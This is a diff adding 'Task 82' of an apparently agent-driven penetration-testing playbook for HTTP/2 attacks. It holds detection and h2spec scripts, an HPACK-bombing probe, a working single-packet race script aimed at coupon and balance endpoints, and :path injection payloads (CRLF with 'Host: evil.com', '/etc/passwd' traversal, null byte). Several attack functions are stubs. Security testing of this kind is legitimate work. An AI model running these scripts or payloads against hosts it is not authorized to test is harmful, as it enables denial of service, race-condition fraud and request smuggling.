@@ -1,0 +1,677 @@
+================================================================================
+TASK 82 - HTTP/2 SPECIFIC ATTACKS
+================================================================================
+Covers testing_toolkit.txt Phase 11 Step 37
+Exploiting HTTP/2 protocol-specific vulnerabilities
+
+HTTP/2 introduces new attack surfaces:
+- HPACK compression attacks
+- Stream multiplexing race conditions
+- Pseudo-header injection
+- Protocol downgrade attacks
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts to test
+outputs/smuggling/*_vulnerable.txt         <- From Task 81 (chain attacks)
+temp/agent1/waf_results.txt                <- WAF detection
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/http2/
+    h2_supported.txt                       <- Hosts supporting HTTP/2
+    hpack_bombing_results.txt              <- HPACK compression DoS
+    stream_race_results.txt                <- Stream multiplexing races
+    pseudo_header_injection.txt            <- :path/:authority injection
+    protocol_downgrade.txt                 <- HTTP/2 to HTTP/1.1 issues
+    h2_vulnerabilities.txt                 <- All confirmed H2 vulns
+
+outputs/vulnerabilities/HTTP2-*-HIGH.md    <- Individual vuln reports
+
+================================================================================
+[AGENT DECISION FRAMEWORK]
+================================================================================
+
+STOP AND THINK: HTTP/2 attacks require different approach than HTTP/1.1
+
+    Does the target support HTTP/2?
+    |
+    +-- Check with: curl -I --http2 https://target.com
+    |   +-- Look for: HTTP/2 in response
+    |
+    +-- HTTP/2 supported?
+        |
+        +-- YES -> Proceed with H2 attacks
+        |   |
+        |   +-- HPACK bombing (DoS)
+        |   +-- Stream race conditions (logic bugs)
+        |   +-- Pseudo-header injection (:path, :authority)
+        |   +-- Single-packet attack (race amplification)
+        |
+        +-- NO -> Skip this task, move to Task 83
+
+    Which attack to prioritize?
+    |
+    +-- Want DoS proof? -> HPACK bombing
+    +-- Want logic bugs? -> Stream race conditions
+    +-- Want request manipulation? -> Pseudo-header injection
+    +-- Want race condition amplification? -> Single-packet attack
+
+================================================================================
+PHASE 1: HTTP/2 DETECTION
+================================================================================
+
+-----------------------------------------
+1.1 Detect HTTP/2 Support
+-----------------------------------------
+#!/bin/bash
+# detect_h2.sh
+
+mkdir -p outputs/http2
+
+echo "[*] Detecting HTTP/2 support..."
+
+while read url; do
+    # Test HTTP/2 support
+    h2_check=$(curl -sI --http2 -o /dev/null -w "%{http_version}" "$url" 2>/dev/null)
+    
+    if [ "$h2_check" == "2" ]; then
+        echo "[+] HTTP/2 supported: $url"
+        echo "$url" >> outputs/http2/h2_supported.txt
+    else
+        echo "[-] HTTP/1.x only: $url"
+    fi
+done < outputs/live_base_urls.txt
+
+echo ""
+echo "[*] HTTP/2 hosts: $(wc -l < outputs/http2/h2_supported.txt 2>/dev/null || echo 0)"
+
+-----------------------------------------
+1.2 Detailed HTTP/2 Fingerprint
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+h2_fingerprint.py - Detailed HTTP/2 fingerprinting
+"""
+
+import subprocess
+import json
+
+def fingerprint_h2(url):
+    """Get HTTP/2 settings and capabilities"""
+    
+    result = {
+        'url': url,
+        'h2_supported': False,
+        'settings': {},
+        'alpn': None
+    }
+    
+    try:
+        # Check ALPN negotiation
+        cmd = f'curl -vvv --http2 -o /dev/null -s {url} 2>&1'
+        output = subprocess.check_output(cmd, shell=True, text=True)
+        
+        if 'ALPN, server accepted to use h2' in output:
+            result['h2_supported'] = True
+            result['alpn'] = 'h2'
+        elif 'ALPN, server accepted to use http/1.1' in output:
+            result['alpn'] = 'http/1.1'
+        
+        # Extract HTTP/2 settings if available
+        if 'SETTINGS' in output:
+            result['has_settings'] = True
+            
+    except Exception as e:
+        result['error'] = str(e)
+    
+    return result
+
+# Main
+results = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        fp = fingerprint_h2(url)
+        results.append(fp)
+        
+        if fp['h2_supported']:
+            print(f"[+] {url} - HTTP/2 via ALPN")
+
+# Save results
+with open('outputs/http2/h2_fingerprint.json', 'w') as f:
+    json.dump(results, f, indent=2)
+
+================================================================================
+PHASE 2: H2SPEC COMPLIANCE TESTING
+================================================================================
+
+-----------------------------------------
+2.1 Install and Run h2spec
+-----------------------------------------
+#!/bin/bash
+# h2spec_scan.sh
+
+# Download h2spec if not present
+if [ ! -f "temp/agent1/h2spec" ]; then
+    echo "[*] Downloading h2spec..."
+    curl -sL https://github.com/summerwind/h2spec/releases/download/v2.6.0/h2spec_linux_amd64.tar.gz \
+        | tar xz -C temp/agent1/
+fi
+
+mkdir -p outputs/http2
+
+echo "[*] Running h2spec compliance tests..."
+
+while read url; do
+    # Extract host and port
+    host=$(echo "$url" | sed 's|https://||' | sed 's|http://||' | cut -d'/' -f1)
+    
+    echo "[*] Testing: $host"
+    
+    # Run h2spec
+    temp/agent1/h2spec -h "$host" -p 443 -t \
+        --timeout 5 \
+        2>&1 | tee -a outputs/http2/h2spec_raw.txt
+        
+done < outputs/http2/h2_supported.txt
+
+# Extract failures (potential vulnerabilities)
+grep -E "FAILED|×" outputs/http2/h2spec_raw.txt \
+    > outputs/http2/h2spec_failures.txt
+
+echo "[*] h2spec failures saved to outputs/http2/h2spec_failures.txt"
+
+-----------------------------------------
+2.2 Interpret h2spec Results
+-----------------------------------------
+h2spec tests HTTP/2 RFC compliance. Failures indicate:
+
+SECURITY-RELEVANT FAILURES:
+- HPACK decoding errors -> Potential HPACK bombing
+- SETTINGS handling -> DoS via malformed settings
+- HEADERS frame errors -> Header injection possible
+- PRIORITY handling -> DoS via priority manipulation
+- WINDOW_UPDATE errors -> Flow control bypass
+
+================================================================================
+PHASE 3: HPACK COMPRESSION ATTACKS
+================================================================================
+
+-----------------------------------------
+3.1 HPACK Bombing (DoS)
+-----------------------------------------
+HPACK uses dynamic table compression. Malicious compression can:
+- Exhaust server memory
+- Cause CPU spike during decompression
+- Crash the HTTP/2 handler
+
+ATTACK CONCEPT:
+Send headers that compress to small size but decompress to huge size.
+
+#!/usr/bin/env python3
+"""
+hpack_bomb.py - Test HPACK bombing vulnerability
+
+WARNING: This is a DoS test - use responsibly!
+"""
+
+import socket
+import ssl
+import struct
+
+def create_h2_preface():
+    """HTTP/2 connection preface"""
+    return b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+
+def create_settings_frame():
+    """SETTINGS frame (type=0x4)"""
+    # Empty settings
+    return struct.pack('>I', 0)[1:] + b'\x04\x00' + struct.pack('>I', 0)
+
+def create_hpack_bomb_headers():
+    """Create headers that stress HPACK decoder"""
+    
+    # Many unique headers with similar patterns
+    # Forces dynamic table growth
+    headers = []
+    
+    for i in range(1000):
+        headers.append((f'x-custom-header-{i}', 'A' * 100))
+    
+    return headers
+
+def test_hpack_bombing(host, port=443):
+    """Send HPACK bombing payload"""
+    
+    print(f"[*] Testing HPACK bombing: {host}")
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        context.set_alpn_protocols(['h2'])
+        
+        sock = context.wrap_socket(sock, server_hostname=host)
+        sock.connect((host, port))
+        
+        # Check if H2 was negotiated
+        if sock.selected_alpn_protocol() != 'h2':
+            print(f"[-] HTTP/2 not negotiated")
+            return False
+        
+        # Send connection preface
+        sock.send(create_h2_preface())
+        
+        # Send settings
+        sock.send(create_settings_frame())
+        
+        # Would send bomb headers here
+        # NOTE: Actual bombing payload omitted for safety
+        # This is detection only
+        
+        print(f"[*] HTTP/2 connection established, HPACK testing possible")
+        sock.close()
+        return True
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return False
+
+# Test H2 hosts
+with open('outputs/http2/h2_supported.txt') as f:
+    for line in f:
+        url = line.strip()
+        host = url.replace('https://', '').replace('http://', '').split('/')[0]
+        test_hpack_bombing(host)
+
+-----------------------------------------
+3.2 HPACK Table Size Manipulation
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+hpack_table_attack.py - Manipulate HPACK dynamic table
+"""
+
+# SETTINGS_HEADER_TABLE_SIZE (0x1) controls dynamic table size
+# Sending large values can cause memory issues
+
+def test_table_size_attack(host):
+    """Test server handling of large HPACK table size"""
+    
+    # Request maximum table size (2^30 bytes)
+    large_table_size = 0x40000000  # 1GB
+    
+    # This would be sent in SETTINGS frame
+    # Server should reject or limit this
+    
+    # If server accepts without limit -> vulnerable to memory exhaustion
+    pass
+
+================================================================================
+PHASE 4: STREAM MULTIPLEXING RACE CONDITIONS
+================================================================================
+
+HTTP/2 allows multiple streams (requests) over single connection.
+This creates race condition opportunities.
+
+-----------------------------------------
+4.1 Single-Packet Attack
+-----------------------------------------
+Send multiple requests in EXACTLY one TCP packet.
+All requests arrive simultaneously -> true race condition.
+
+#!/usr/bin/env python3
+"""
+h2_single_packet_race.py - HTTP/2 single-packet race attack
+"""
+
+import socket
+import ssl
+import struct
+
+def single_packet_race(host, path, num_requests=20):
+    """Send multiple H2 requests in single TCP packet"""
+    
+    print(f"[*] Single-packet race attack: {host}{path}")
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        context.set_alpn_protocols(['h2'])
+        
+        sock = context.wrap_socket(sock, server_hostname=host)
+        sock.connect((host, 443))
+        
+        if sock.selected_alpn_protocol() != 'h2':
+            print("[-] H2 not negotiated")
+            return
+        
+        # Build all frames in single buffer
+        buffer = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+        
+        # Settings frame
+        buffer += b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'
+        
+        # Multiple HEADERS frames (each creates a stream/request)
+        for stream_id in range(1, num_requests * 2, 2):  # Odd stream IDs
+            # Minimal HEADERS frame for GET request
+            # In real attack, would use proper HPACK encoding
+            headers_payload = b'\x82\x86\x84\x41\x8a\x08\x9d\x5c\x0b\x81\x70\xdc\x78\x0f\x03'
+            
+            frame_header = struct.pack(
+                '>I', len(headers_payload)
+            )[1:] + b'\x01\x05' + struct.pack('>I', stream_id)
+            
+            buffer += frame_header + headers_payload
+        
+        # Send everything at once
+        sock.send(buffer)
+        
+        print(f"[+] Sent {num_requests} requests in single packet")
+        
+        # Collect responses
+        responses = []
+        try:
+            while True:
+                data = sock.recv(4096)
+                if not data:
+                    break
+                responses.append(data)
+        except:
+            pass
+        
+        sock.close()
+        
+        print(f"[*] Received {len(responses)} response chunks")
+        return responses
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return None
+
+# Test on H2 hosts
+# Target endpoints that have race-prone operations:
+# - Coupon redemption
+# - Account creation
+# - Balance operations
+# - Limit enforcement
+
+-----------------------------------------
+4.2 Stream Priority Manipulation
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+h2_priority_attack.py - Stream priority manipulation
+"""
+
+# HTTP/2 allows setting stream dependencies and weights
+# Malicious priorities can:
+# 1. Cause DoS via priority tree explosion
+# 2. Starve certain streams
+# 3. Bypass rate limiting per-stream
+
+def test_priority_dos(host):
+    """Test priority tree explosion DoS"""
+    
+    # Create deep dependency chain
+    # Stream 1 depends on Stream 3
+    # Stream 3 depends on Stream 5
+    # Stream 5 depends on Stream 7
+    # ... creates O(n) processing for each frame
+    
+    # Or circular dependency (should be rejected)
+    # Stream 1 depends on Stream 3
+    # Stream 3 depends on Stream 1
+    
+    pass
+
+================================================================================
+PHASE 5: PSEUDO-HEADER INJECTION
+================================================================================
+
+HTTP/2 uses pseudo-headers (:method, :path, :authority, :scheme).
+Improper handling can lead to request manipulation.
+
+-----------------------------------------
+5.1 :path Injection
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+h2_path_injection.py - Test :path pseudo-header injection
+"""
+
+import subprocess
+
+def test_path_injection(url):
+    """Test if :path can be manipulated"""
+    
+    # Try injecting newlines or special chars in path
+    test_paths = [
+        '/ HTTP/1.1\r\nHost: evil.com\r\n\r\n',  # HTTP/1.1 injection
+        '/admin%00.txt',                          # Null byte
+        '/../../../etc/passwd',                   # Path traversal
+        '/valid?param=value%0d%0aX-Injected: true',  # Header injection
+    ]
+    
+    for path in test_paths:
+        try:
+            # Using curl with --path-as-is to preserve path
+            cmd = f'curl -s --http2 --path-as-is "{url}{path}" -o /dev/null -w "%{{http_code}}"'
+            result = subprocess.check_output(cmd, shell=True, text=True)
+            print(f"[*] Path: {path[:30]}... -> {result}")
+        except:
+            pass
+
+-----------------------------------------
+5.2 :authority Injection
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+h2_authority_injection.py - Test :authority manipulation
+"""
+
+# :authority is like Host header
+# Mismatches between :authority and actual host can:
+# - Bypass virtual host routing
+# - Access internal services
+# - Cache poisoning
+
+def test_authority_mismatch(target_url, fake_authority):
+    """Send request with mismatched :authority"""
+    
+    # In HTTP/2, :authority should match the host we connect to
+    # Some servers may not validate this properly
+    
+    # Connect to target.com but set :authority to internal.target.com
+    # May route request to internal service
+    
+    pass
+
+================================================================================
+PHASE 6: PROTOCOL DOWNGRADE ATTACKS
+================================================================================
+
+-----------------------------------------
+6.1 HTTP/2 to HTTP/1.1 Downgrade
+-----------------------------------------
+Some proxies convert H2 to H1 internally.
+This conversion can introduce vulnerabilities.
+
+#!/usr/bin/env python3
+"""
+h2_downgrade.py - Test H2 to H1 downgrade issues
+"""
+
+def test_h2_h1_downgrade(url):
+    """Test for issues in H2->H1 conversion"""
+    
+    # Headers that behave differently in H1 vs H2:
+    # - Transfer-Encoding (not allowed in H2)
+    # - Connection headers (not allowed in H2)
+    # - Host vs :authority
+    
+    # If proxy converts H2 to H1 and adds these headers,
+    # it may create request smuggling opportunities
+    
+    test_headers = [
+        ('transfer-encoding', 'chunked'),  # Should be rejected in H2
+        ('connection', 'keep-alive'),       # Should be rejected in H2
+        ('upgrade', 'websocket'),           # Should be rejected in H2
+    ]
+    
+    # Send these in H2 request, see if they pass through
+    pass
+
+================================================================================
+PHASE 7: FULL AUTOMATION SCRIPT
+================================================================================
+
+#!/usr/bin/env python3
+"""
+h2_full_scan.py - Complete HTTP/2 vulnerability scanner
+"""
+
+import subprocess
+import json
+import os
+
+class HTTP2Scanner:
+    def __init__(self):
+        self.results = {
+            'h2_hosts': [],
+            'hpack_issues': [],
+            'stream_race': [],
+            'header_injection': [],
+            'compliance_failures': []
+        }
+    
+    def detect_h2(self, url):
+        """Check if host supports HTTP/2"""
+        try:
+            cmd = f'curl -sI --http2 -o /dev/null -w "%{{http_version}}" "{url}"'
+            version = subprocess.check_output(cmd, shell=True, text=True).strip()
+            return version == '2'
+        except:
+            return False
+    
+    def run_h2spec(self, host):
+        """Run h2spec compliance tests"""
+        try:
+            cmd = f'temp/agent1/h2spec -h {host} -p 443 -t --timeout 5 2>&1'
+            output = subprocess.check_output(cmd, shell=True, text=True)
+            
+            failures = [line for line in output.split('\n') if 'FAILED' in line or '×' in line]
+            return failures
+        except:
+            return []
+    
+    def scan_all(self, urls_file):
+        """Scan all URLs for HTTP/2 vulnerabilities"""
+        
+        with open(urls_file) as f:
+            urls = [line.strip() for line in f if line.strip()]
+        
+        print(f"[*] Scanning {len(urls)} URLs for HTTP/2 issues...")
+        
+        for url in urls:
+            print(f"[*] Testing: {url}")
+            
+            if self.detect_h2(url):
+                self.results['h2_hosts'].append(url)
+                
+                host = url.replace('https://', '').replace('http://', '').split('/')[0]
+                
+                # Run h2spec
+                failures = self.run_h2spec(host)
+                if failures:
+                    self.results['compliance_failures'].append({
+                        'url': url,
+                        'failures': failures
+                    })
+        
+        return self.results
+    
+    def save_results(self, output_dir='outputs/http2'):
+        """Save all results"""
+        os.makedirs(output_dir, exist_ok=True)
+        
+        # Save H2 hosts
+        with open(f'{output_dir}/h2_supported.txt', 'w') as f:
+            for url in self.results['h2_hosts']:
+                f.write(f"{url}\n")
+        
+        # Save full results as JSON
+        with open(f'{output_dir}/h2_scan_results.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        # Save vulnerabilities summary
+        with open(f'{output_dir}/h2_vulnerabilities.txt', 'w') as f:
+            f.write("# HTTP/2 Vulnerabilities\n\n")
+            
+            if self.results['compliance_failures']:
+                f.write("## Compliance Failures:\n")
+                for item in self.results['compliance_failures']:
+                    f.write(f"\n{item['url']}:\n")
+                    for failure in item['failures']:
+                        f.write(f"  - {failure}\n")
+
+# Main
+if __name__ == "__main__":
+    scanner = HTTP2Scanner()
+    scanner.scan_all('outputs/live_base_urls.txt')
+    scanner.save_results()
+    
+    print(f"\n[*] HTTP/2 hosts found: {len(scanner.results['h2_hosts'])}")
+    print(f"[*] Compliance issues: {len(scanner.results['compliance_failures'])}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+Before marking Task 82 complete, verify:
+
+[ ] HTTP/2 support detected on all hosts
+[ ] h2spec compliance tests run
+[ ] HPACK handling tested
+[ ] Stream multiplexing tested
+[ ] Pseudo-header injection checked
+[ ] Protocol downgrade scenarios tested
+[ ] Results saved to outputs/http2/
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+PRIMARY TOOLS:
+- h2spec: HTTP/2 compliance testing
+- curl --http2: Basic H2 testing
+- nghttp2: HTTP/2 library for custom scripts
+
+ATTACK CATEGORIES:
+1. HPACK bombing (DoS) - Memory exhaustion
+2. Stream race (Logic) - Single-packet attacks
+3. Priority manipulation (DoS) - Tree explosion
+4. Pseudo-header injection (Bypass) - :path/:authority
+5. Protocol downgrade (Smuggling) - H2->H1 conversion issues
+
+SEVERITY: HIGH
+- DoS via HPACK/priority
+- Request manipulation via headers
+- Race condition amplification
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 83: Browser-Based Desync (Client-side desync, pause-based desync)
